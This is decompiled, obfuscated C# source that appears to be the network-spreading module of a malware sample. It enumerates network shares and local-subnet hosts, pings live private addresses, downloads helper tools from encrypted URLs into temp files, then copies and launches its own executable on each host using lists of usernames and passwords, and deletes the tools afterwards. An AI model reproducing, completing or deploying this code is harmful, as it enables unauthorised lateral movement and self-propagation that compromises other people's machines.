using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

internal sealed class tFYEGaopZM
{
	public enum TUMDxuVzZiku
	{
		VRAkiCuSnDs = 1,
		WoqfTFwQtU,
		XghrQmkixbSNLEXM,
		ReNohCQqpIpRVYt,
		aAcPTPdtMUBcu
	}

	public enum CfFHIHLMjwXOw
	{
		ByyszVfgXqDhqPL,
		UKtPWjRNpgx,
		QwTsZMdHTBjuE,
		QRxYUNCAJFCbhU
	}

	public enum rDvZyTVGhL
	{
		NBWrCHuouaNph = 1,
		HPXsFEToNust = 2,
		vuudYcOcWTUMc = 4,
		pXGQxMLrlOrXXTJj = 8,
		kVFSvKGgIeXmsgATD = 16,
		dfuoOuGfpQ = 19
	}

	public enum iqyfLxXkhEvDu
	{
		RQkbvJscwGub,
		QvxsVSvpKMrfG,
		SnNOujTklIoe,
		bcxAibVjVPpSgp,
		psoOZbJyKCJRGe,
		PxIzffWhXNLn,
		GExbTfwnOIOo,
		XtJqHwlqeZ,
		ZQaKuHSSaBCgC,
		UUhBKWxWxWlboH,
		CMoFirmGorEsO,
		xpvzWAMpSLco
	}

	public sealed class ulpfQeMFZo : IEnumerable
	{
		private enum bqjxcFDMQfHo
		{
			zQJVYqGXVvvhKD = 0,
			ewjxAhUHVJ = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class ROLNqVCaOvjnF
		{
			public TUMDxuVzZiku aXikrGhUeTjr;

			public CfFHIHLMjwXOw JQCCKRAHvkbW;

			public iqyfLxXkhEvDu ZdfXFEnOtS;

			public rDvZyTVGhL kHXDDJgWKXzJ;

			public string BPzJkTyzoLm;

			public string ufKbnsyBUaQdsQ;

			public string NDznMFiXcyIS;

			public string UBOZnwpmfqrJJd;
		}

		private ArrayList StLsLSiyNuj = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern bqjxcFDMQfHo WNetOpenEnumA(TUMDxuVzZiku dwScope, CfFHIHLMjwXOw dwType, rDvZyTVGhL dwUsage, ROLNqVCaOvjnF p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern bqjxcFDMQfHo WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern bqjxcFDMQfHo WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(ROLNqVCaOvjnF rolnqVCaOvjnF_0, TUMDxuVzZiku tumdxuVzZiku_0, CfFHIHLMjwXOw cfFHIHLMjwXOw_0, rDvZyTVGhL rDvZyTVGhL_0, iqyfLxXkhEvDu iqyfLxXkhEvDu_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(tumdxuVzZiku_0, cfFHIHLMjwXOw_0, rDvZyTVGhL_0, rolnqVCaOvjnF_0, out lphEnum) == bqjxcFDMQfHo.zQJVYqGXVvvhKD)
			{
				bqjxcFDMQfHo bqjxcFDMQfHo;
				do
				{
					bqjxcFDMQfHo = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (bqjxcFDMQfHo)
					{
					case bqjxcFDMQfHo.ewjxAhUHVJ:
						continue;
					case bqjxcFDMQfHo.zQJVYqGXVvvhKD:
						Marshal.PtrToStructure(intPtr, rolnqVCaOvjnF_0);
						if (rolnqVCaOvjnF_0.ZdfXFEnOtS == iqyfLxXkhEvDu_0)
						{
							StLsLSiyNuj.Add(rolnqVCaOvjnF_0.ufKbnsyBUaQdsQ);
						}
						if ((rolnqVCaOvjnF_0.kHXDDJgWKXzJ & rDvZyTVGhL.HPXsFEToNust) == rDvZyTVGhL.HPXsFEToNust)
						{
							EnumerateServers(rolnqVCaOvjnF_0, tumdxuVzZiku_0, cfFHIHLMjwXOw_0, rDvZyTVGhL_0, iqyfLxXkhEvDu_0);
						}
						continue;
					}
					break;
				}
				while (bqjxcFDMQfHo != bqjxcFDMQfHo.ewjxAhUHVJ);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public ulpfQeMFZo(TUMDxuVzZiku tumdxuVzZiku_0, CfFHIHLMjwXOw cfFHIHLMjwXOw_0, rDvZyTVGhL rDvZyTVGhL_0, iqyfLxXkhEvDu iqyfLxXkhEvDu_0)
		{
			ROLNqVCaOvjnF rolnqVCaOvjnF_ = new ROLNqVCaOvjnF();
			EnumerateServers(rolnqVCaOvjnF_, tumdxuVzZiku_0, cfFHIHLMjwXOw_0, rDvZyTVGhL_0, iqyfLxXkhEvDu_0);
		}

		public IEnumerator GetEnumerator()
		{
			return StLsLSiyNuj.GetEnumerator();
		}
	}

	private sealed class NhWvNXbhhgFWhDA
	{
		public string CvWzVveYIj;

		public string KVOPxnvFjGni;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107398227)) && !string_0.StartsWith(getString_0(107398254)) && !string_0.StartsWith(getString_0(107398245)) && !string_0.Contains(getString_0(107398200))) || !kWHZZpVXtBq(string_0))
			{
				return;
			}
			if (ACJZwXMCdgNnIA.cFytzeDiRIaBA == getString_0(107396963))
			{
				for (int i = 0; i < XcdjEpqgDJBL.Count; i++)
				{
					if (ACJZwXMCdgNnIA.GyAtBojDqJQga)
					{
						if (File.Exists(CvWzVveYIj))
						{
							ACJZwXMCdgNnIA.avwQPvqZWjHd(CvWzVveYIj, getString_0(107400413) + string_0 + getString_0(107348579) + XcdjEpqgDJBL[i] + getString_0(107348538) + YoDhgQZkrhqbI[i] + getString_0(107348529) + Assembly.GetEntryAssembly()!.Location + getString_0(107400399));
						}
					}
					else if (File.Exists(KVOPxnvFjGni))
					{
						ACJZwXMCdgNnIA.avwQPvqZWjHd(KVOPxnvFjGni, getString_0(107400413) + string_0 + getString_0(107348579) + XcdjEpqgDJBL[i] + getString_0(107348538) + YoDhgQZkrhqbI[i] + getString_0(107348496) + Assembly.GetEntryAssembly()!.Location + getString_0(107400399));
					}
				}
			}
			else if (ACJZwXMCdgNnIA.GyAtBojDqJQga)
			{
				if (File.Exists(CvWzVveYIj))
				{
					ACJZwXMCdgNnIA.avwQPvqZWjHd(CvWzVveYIj, getString_0(107400413) + string_0 + getString_0(107348439) + Assembly.GetEntryAssembly()!.Location + getString_0(107400399));
				}
			}
			else if (File.Exists(KVOPxnvFjGni))
			{
				ACJZwXMCdgNnIA.avwQPvqZWjHd(KVOPxnvFjGni, getString_0(107400413) + string_0 + getString_0(107380662) + Assembly.GetEntryAssembly()!.Location + getString_0(107400399));
			}
		}

		static NhWvNXbhhgFWhDA()
		{
			Strings.CreateGetStringDelegate(typeof(NhWvNXbhhgFWhDA));
		}
	}

	public static List<string> xVJhTUghqhgp;

	public static string LpdOBIvuPwBY;

	public static List<string> XcdjEpqgDJBL;

	public static List<string> YoDhgQZkrhqbI;

	public static List<string> GGHspQjoMAUkAaV;

	public List<string> FDleqroteVNk = new List<string>();

	public List<string> dTeSDfzsrsl = new List<string>();

	public List<string> UoMbasUbgaHxqWd = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static void WytzYUVUhFF()
	{
		NhWvNXbhhgFWhDA CS_0024_003C_003E8__locals0 = new NhWvNXbhhgFWhDA();
		ACJZwXMCdgNnIA.ZRCFFrorRKRQQW();
		List<ZaVBFWJyYjjv> list = ZaVBFWJyYjjv.PtVoHDGdwu();
		foreach (ZaVBFWJyYjjv item in list)
		{
			xVJhTUghqhgp.Add(item.IPAddress);
		}
		if (ACJZwXMCdgNnIA.GDqBfWNbeWwjD.Count > 0)
		{
			xVJhTUghqhgp = xVJhTUghqhgp.Union(ACJZwXMCdgNnIA.GDqBfWNbeWwjD).ToList();
		}
		CS_0024_003C_003E8__locals0.CvWzVveYIj = getString_0(107401621);
		CS_0024_003C_003E8__locals0.KVOPxnvFjGni = getString_0(107401621);
		try
		{
			CS_0024_003C_003E8__locals0.CvWzVveYIj = rHBWSThjFI();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.KVOPxnvFjGni = dIPiRGcrTj();
		}
		catch
		{
		}
		foreach (ZaVBFWJyYjjv item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107398181)) || item2.IPAddress.StartsWith(getString_0(107398208)) || item2.IPAddress.StartsWith(getString_0(107398199)) || item2.IPAddress.Contains(getString_0(107398154)))
				{
					BVUgzDKPmw.IpcrTQLTHOlEJ(item2.MacAddress, item2.IPAddress, getString_0(107348287));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(xVJhTUghqhgp, delegate(string string_0)
			{
				if ((string_0.StartsWith(NhWvNXbhhgFWhDA.getString_0(107398227)) || string_0.StartsWith(NhWvNXbhhgFWhDA.getString_0(107398254)) || string_0.StartsWith(NhWvNXbhhgFWhDA.getString_0(107398245)) || string_0.Contains(NhWvNXbhhgFWhDA.getString_0(107398200))) && kWHZZpVXtBq(string_0))
				{
					if (ACJZwXMCdgNnIA.cFytzeDiRIaBA == NhWvNXbhhgFWhDA.getString_0(107396963))
					{
						for (int i = 0; i < XcdjEpqgDJBL.Count; i++)
						{
							if (ACJZwXMCdgNnIA.GyAtBojDqJQga)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.CvWzVveYIj))
								{
									ACJZwXMCdgNnIA.avwQPvqZWjHd(CS_0024_003C_003E8__locals0.CvWzVveYIj, NhWvNXbhhgFWhDA.getString_0(107400413) + string_0 + NhWvNXbhhgFWhDA.getString_0(107348579) + XcdjEpqgDJBL[i] + NhWvNXbhhgFWhDA.getString_0(107348538) + YoDhgQZkrhqbI[i] + NhWvNXbhhgFWhDA.getString_0(107348529) + Assembly.GetEntryAssembly()!.Location + NhWvNXbhhgFWhDA.getString_0(107400399));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.KVOPxnvFjGni))
							{
								ACJZwXMCdgNnIA.avwQPvqZWjHd(CS_0024_003C_003E8__locals0.KVOPxnvFjGni, NhWvNXbhhgFWhDA.getString_0(107400413) + string_0 + NhWvNXbhhgFWhDA.getString_0(107348579) + XcdjEpqgDJBL[i] + NhWvNXbhhgFWhDA.getString_0(107348538) + YoDhgQZkrhqbI[i] + NhWvNXbhhgFWhDA.getString_0(107348496) + Assembly.GetEntryAssembly()!.Location + NhWvNXbhhgFWhDA.getString_0(107400399));
							}
						}
					}
					else if (ACJZwXMCdgNnIA.GyAtBojDqJQga)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.CvWzVveYIj))
						{
							ACJZwXMCdgNnIA.avwQPvqZWjHd(CS_0024_003C_003E8__locals0.CvWzVveYIj, NhWvNXbhhgFWhDA.getString_0(107400413) + string_0 + NhWvNXbhhgFWhDA.getString_0(107348439) + Assembly.GetEntryAssembly()!.Location + NhWvNXbhhgFWhDA.getString_0(107400399));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.KVOPxnvFjGni))
					{
						ACJZwXMCdgNnIA.avwQPvqZWjHd(CS_0024_003C_003E8__locals0.KVOPxnvFjGni, NhWvNXbhhgFWhDA.getString_0(107400413) + string_0 + NhWvNXbhhgFWhDA.getString_0(107380662) + Assembly.GetEntryAssembly()!.Location + NhWvNXbhhgFWhDA.getString_0(107400399));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.CvWzVveYIj))
			{
				File.Delete(CS_0024_003C_003E8__locals0.CvWzVveYIj);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.KVOPxnvFjGni))
			{
				File.Delete(CS_0024_003C_003E8__locals0.KVOPxnvFjGni);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rHBWSThjFI()
	{
		if (IntPtr.Size == 8)
		{
			return mlZxRSzfuC(new Uri(ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107348234))));
		}
		return mlZxRSzfuC(new Uri(ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107348234))));
	}

	public static string dIPiRGcrTj()
	{
		if (IntPtr.Size == 8)
		{
			return mlZxRSzfuC(new Uri(ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107348185))));
		}
		return mlZxRSzfuC(new Uri(ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107348588))));
	}

	public static bool kWHZZpVXtBq(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string mlZxRSzfuC(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107348515), getString_0(107401621)).Remove(0, 3) + getString_0(107348542);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static tFYEGaopZM()
	{
		Strings.CreateGetStringDelegate(typeof(tFYEGaopZM));
		xVJhTUghqhgp = new List<string>();
		LpdOBIvuPwBY = getString_0(107401621);
		XcdjEpqgDJBL = new List<string>();
		YoDhgQZkrhqbI = new List<string>();
		GGHspQjoMAUkAaV = new List<string>();
	}
}
